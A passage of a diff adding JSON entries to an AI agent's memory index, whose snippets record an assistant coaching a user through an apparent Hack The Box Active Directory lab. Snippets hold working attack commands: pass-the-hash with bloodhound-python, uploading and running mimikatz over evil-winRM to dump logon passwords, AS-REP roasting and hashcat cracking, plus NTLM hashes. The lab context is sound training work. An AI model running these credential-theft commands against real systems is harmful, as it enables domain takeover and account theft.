+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "bloodhound-python",
+        "inlanefreight.local",
+        "172.16.7.3",
+        "bloodhound.py",
+        "4.2",
+        "4.3",
+        "usr/bin/bloodhound-python",
+        "bloodhound"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:151:151": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:151:151",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 151,
+      "endLine": 151,
+      "source": "memory",
+      "snippet": "User: administrator.htb -c all -ns 10.129.245.95^C ┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/ad-enumeration-attacks/part2/raw_data] └─$ bloodhound-python -d INLANEFREIGHT.LOCAL -u Administrator --hashes bdaffbfe64f1fc646a3353be1c2c3c99 -c All -ns 172.16.7.3",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "administrator.htb",
+        "10.129.245.95",
+        "bloodhound-python",
+        "inlanefreight.local",
+        "172.16.7.3",
+        "all",
+        "openclaw",
+        "srv1405873"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:152:152": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:152:152",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 152,
+      "endLine": 152,
+      "source": "memory",
+      "snippet": "Assistant: I literally just gave you the fix — you need **`LMHASH:NTHASH`** with a **colon**. Empty LM hash is `aad3b435b51404eeaad3b435b51404ee`. **Corrected command:** ```bash bloodhound-python -d INLANEFREIGHT.LOCAL -u Administrator --hashes 'aad3b435b51404eeaad3b435b51404ee:b",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "bloodhound-python",
+        "inlanefreight.local",
+        "literally",
+        "gave",
+        "fix",
+        "need",
+        "lmhash:nthash",
+        "colon"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:153:153": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:153:153",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 153,
+      "endLine": 153,
+      "source": "memory",
+      "snippet": "User: [media attached: 2 files] [media attached 1/2: /home/openclaw/.openclaw/media/inbound/file_120---8c38c379-14cf-4387-96f2-cb7bf29d12ab.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_120---8c38c379-14cf-4387-96f2-cb7bf29d12ab.jpg] [media attached 2/2: /home/op",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "1/2",
+        "home/openclaw",
+        "openclaw/media/inbound/file-120",
+        "image/jpeg",
+        "2/2",
+        "home/op",
+        "media",
+        "attached"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:154:154": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:154:154",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 154,
+      "endLine": 154,
+      "source": "memory",
+      "snippet": "User: in the text body. CT059? I tested with earlier BR086 bloodhound works. There was an error with bloodhound again. Also, how to cleanup old bloodhound upload? via bloodhound-cli? or webui?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "bloodhound-cli",
+        "body",
+        "ct059",
+        "tested",
+        "earlier",
+        "br086",
+        "bloodhound",
+        "works"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:155:155": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:155:155",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 155,
+      "endLine": 155,
+      "source": "memory",
+      "snippet": "Assistant: 🔷 **Q9 answer is right there: `CT059@INLANEFREIGHT.LOCAL`** — it's in the **Inbound Object Control (4)** list for Domain Admins. That's your user with GenericAll. --- **About the bloodhound-python error:** The hash auth failed because: - SMB hash auth ≠ Kerberos/LDAP",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "inlanefreight.local",
+        "bloodhound-python",
+        "kerberos/ldap",
+        "answer",
+        "right",
+        "ct059",
+        "it's",
+        "inbound"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:156:156": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:156:156",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 156,
+      "endLine": 156,
+      "source": "memory",
+      "snippet": "Assistant: Clear Database - Or individual uploads: drag the uploaded data to the trash icon **Option 2: Neo4j CLI** (for legacy BloodHound): ```bash # Clear all nodes/edges sudo neo4j stop sudo rm -rf /var/lib/neo4j/data/databases/neo4j/* sudo rm -rf /var/lib/neo4j/data/transacti",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "nodes/edges",
+        "var/lib/neo4j/data/transacti",
+        "clear",
+        "database",
+        "individual",
+        "uploads",
+        "drag",
+        "uploaded"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:157:157": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:157:157",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 157,
+      "endLine": 157,
+      "source": "memory",
+      "snippet": "Assistant: GenericAll** by clicking on CT059 in BloodHound and checking its **Outbound Object Control**. Is it GenericAll specifically? Also, what did `bloodhound-python` with BR086 output? Did it complete?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "bloodhound-python",
+        "genericall",
+        "clicking",
+        "ct059",
+        "bloodhound",
+        "checking",
+        "outbound",
+        "object"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:158:158": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:158:158",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 158,
+      "endLine": 158,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_122---5f59a0a7-6701-4966-84dc-64b1be648cc8.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_122---5f59a0a7-6701-4966-84dc-64b1be648cc8.jpg] To send an image back, prefer the message tool (media/path/",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-122",
+        "image/jpeg",
+        "media/path",
+        "media",
+        "attached",
+        "home",
+        "openclaw"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:159:159": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:159:159",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 159,
+      "endLine": 159,
+      "source": "memory",
+      "snippet": "Assistant: 🔷 **Q9 confirmed: `CT059@INLANEFREIGHT.LOCAL`** — and that image is devastating. CT059 has **GenericAll over almost every privileged group**: Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, etc. This is a massive over-permissioned",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "backup",
+        "inlanefreight.local",
+        "over-permissioned",
+        "confirmed",
+        "ct059",
+        "image",
+        "devastating",
+        "has"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:160:160": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:160:160",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 160,
+      "endLine": 160,
+      "source": "memory",
+      "snippet": "Assistant: \"privilege::debug\" \"token:***\" \"sekurlsa::logonpasswords\" \"exit\" # Look for CT059 in the output ``` **3. Check if CT059's password is in any files we've missed:** ```bash # On Parrot, search your collected data grep -ri \"ct059\" /tmp/ 2>/dev/null grep -ri \"CT059\" ~/.ope",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "dev/null",
+        "privilege",
+        "debug",
+        "token",
+        "sekurlsa",
+        "logonpasswords",
+        "exit",
+        "look"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:161:161": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:161:161",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 161,
+      "endLine": 161,
+      "source": "memory",
+      "snippet": "Assistant: show?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "show"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:162:162": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:162:162",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 162,
+      "endLine": 162,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_122---5f59a0a7-6701-4966-84dc-64b1be648cc8.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_122---5f59a0a7-6701-4966-84dc-64b1be648cc8.jpg] Confirmed",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-122",
+        "image/jpeg",
+        "media",
+        "attached",
+        "home",
+        "openclaw",
+        "inbound"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:163:163": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:163:163",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 163,
+      "endLine": 163,
+      "source": "memory",
+      "snippet": "User: let's upload mimikatz and try to check for hashes or passwrods realted to CT059",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "let's",
+        "upload",
+        "mimikatz",
+        "try",
+        "check",
+        "hashes",
+        "passwrods",
+        "realted"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:164:164": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:164:164",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 164,
+      "endLine": 164,
+      "source": "memory",
+      "snippet": "Assistant: From your **Administrator evil-winRM session on MS01**: **Step 1 — Upload mimikatz:** ```powershell upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Windows\\Temp\\mimikatz.exe ``` **Step 2 — Dump everything:** ```powershell C:\\Windows\\Temp\\mimikatz.exe \"",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "mimikatz.exe",
+        "administrator",
+        "evil",
+        "winrm",
+        "ms01",
+        "step",
+        "upload"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:165:165": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:165:165",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 165,
+      "endLine": 165,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_123---36a196c5-331c-405c-b5da-7f24f6794db4.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_123---36a196c5-331c-405c-b5da-7f24f6794db4.jpg] To send an image back, prefer the message tool (media/path/",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-123",
+        "image/jpeg",
+        "media/path",
+        "media",
+        "attached",
+        "home",
+        "openclaw"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:166:166": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:166:166",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 166,
+      "endLine": 166,
+      "source": "memory",
+      "snippet": "Assistant: Right — **evil-winRM + interactive mimikatz = infinite loop**. evil-winRM's PTY doesn't play nice with mimikatz's interactive prompt. **Fix: Run mimikatz non-interactively with command-line args:** ```powershell # In your evil-winRM session C:\\Windows\\Temp\\mimikatz.exe",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "non-interactively",
+        "command-line",
+        "mimikatz.exe",
+        "right",
+        "evil",
+        "winrm",
+        "interactive"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:167:167": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:167:167",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 167,
+      "endLine": 167,
+      "source": "memory",
+      "snippet": "Assistant: -command \"Import-Module C:\\Windows\\Temp\\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command 'privilege::debug token:*** sekurlsa::logonpasswords exit'\" ``` **Kill the current mimikatz session first** — `Ctrl+C` or close evil-winRM and reconnect. Run the non-interactive versi",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "import-module",
+        "invoke-mimikatz.ps1",
+        "invoke-mimikatz",
+        "evil-winrm",
+        "non-interactive",
+        "command",
+        "import",
+        "module"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:168:168": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:168:168",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 168,
+      "endLine": 168,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_123---36a196c5-331c-405c-b5da-7f24f6794db4.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_123---36a196c5-331c-405c-b5da-7f24f6794db4.jpg] Exectuing mimikatz via evil-wirnm seems to have results in",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-123",
+        "image/jpeg",
+        "evil-wirnm",
+        "media",
+        "attached",
+        "home",
+        "openclaw"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:169:169": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:169:169",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 169,
+      "endLine": 169,
+      "source": "memory",
+      "snippet": "User: let's download mimi.log so we have copy",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "mimi.log",
+        "let's",
+        "download",
+        "copy"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:170:170": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:170:170",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 170,
+      "endLine": 170,
+      "source": "memory",
+      "snippet": "Assistant: In your **evil-winRM session**, run this: **Step 1 — Run mimikatz non-interactively, redirect to log file:** ```powershell C:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"token:***\" \"sekurlsa::logonpasswords\" \"exit\" > C:\\Windows\\Temp\\mimi.log ``` **Step 2 — Download t",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "non-interactively",
+        "mimikatz.exe",
+        "mimi.log",
+        "evil",
+        "winrm",
+        "run",
+        "step"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:171:171": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:171:171",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 171,
+      "endLine": 171,
+      "source": "memory",
+      "snippet": "User: Got an error Directory: C:\\Windows\\Temp Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 4/30/2022 6:16 PM vmware-SYSTEM -a---- 5/1/2026 10:05 AM 28652 mimi.log -a---- 5/1/2026 4:51 AM 102 silconfig.log -a---- 4/30/2022 6:18 PM 1144896 vmware-vmsvc-SYSTE",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "4/30/2022",
+        "vmware-system",
+        "5/1/2026",
+        "mimi.log",
+        "silconfig.log",
+        "vmware-vmsvc-syste",
+        "got",
+        "error"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:172:172": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:172:172",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 172,
+      "endLine": 172,
+      "source": "memory",
+      "snippet": "User: filenames or paths",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "filenames",
+        "paths"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:173:173": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:173:173",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 173,
+      "endLine": 173,
+      "source": "memory",
+      "snippet": "Assistant: Path got mangled — evil-winRM's download parser doubled it up. Since you're already in `C:\\Windows\\Temp`, just use the filename: ```powershell download mimi.log /tmp/mimi.log ``` Or with forward slashes (evil-winRM handles those better): ```powershell download C:/Windo",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "mimi.log",
+        "tmp/mimi.log",
+        "path",
+        "got",
+        "mangled",
+        "evil",
+        "winrm's"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:174:174": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:174:174",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 174,
+      "endLine": 174,
+      "source": "memory",
+      "snippet": "User: The hash isn't in the mimikatz dump. See /home/openclaw/.openclaw/workspace-neo/htb/academy/ad-enumeration-attacks/part2/raw_data/mimikatz_logon_password_dump_administrator.txt Maybe we can do something like responder or inveigh? to listen for its hash?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "hash",
+        "isn't",
+        "mimikatz",
+        "dump",
+        "see",
+        "home",
+        "openclaw"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:175:175": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:175:175",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 175,
+      "endLine": 175,
+      "source": "memory",
+      "snippet": "Assistant: 🔷 Good thinking — but **Responder only works if CT059 actively tries to resolve/connect to a non-existent host.** Since CT059 is likely a dormant service account, we can't force it to authenticate to us. Better approaches for Q10 (getting CT059's password): **Option 1",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "resolve/connect",
+        "non-existent",
+        "good",
+        "thinking",
+        "but",
+        "responder",
+        "only",
+        "works"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:176:176": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:176:176",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 176,
+      "endLine": 176,
+      "source": "memory",
+      "snippet": "Assistant: -format hashcat -outputfile /tmp/ct059_asrep.txt ``` If it returns a hash, crack it with hashcat: ```bash hashcat -m 18200 /tmp/ct059_asrep.txt /usr/share/wordlists/rockyou.txt ``` **Option 3: Check BloodHound — who controls CT059?** In BloodHound, search for **CT059**",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "tmp/ct059-asrep.txt",
+        "usr/share/wordlists/rockyou.txt",
+        "format",
+        "hashcat",
+        "outputfile",
+        "tmp",
+        "ct059-asrep.txt",
+        "returns"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:177:177": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:177:177",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 177,
+      "endLine": 177,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_124---570b2152-a9a3-404a-8216-42f10aaafc21.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_124---570b2152-a9a3-404a-8216-42f10aaafc21.jpg] To send an image back, prefer the message tool (media/path/",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-124",
+        "image/jpeg",
+        "media/path",
+        "media",
+        "attached",
+        "home",
+        "openclaw"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:178:178": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:178:178",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 178,
+      "endLine": 178,
+      "source": "memory",
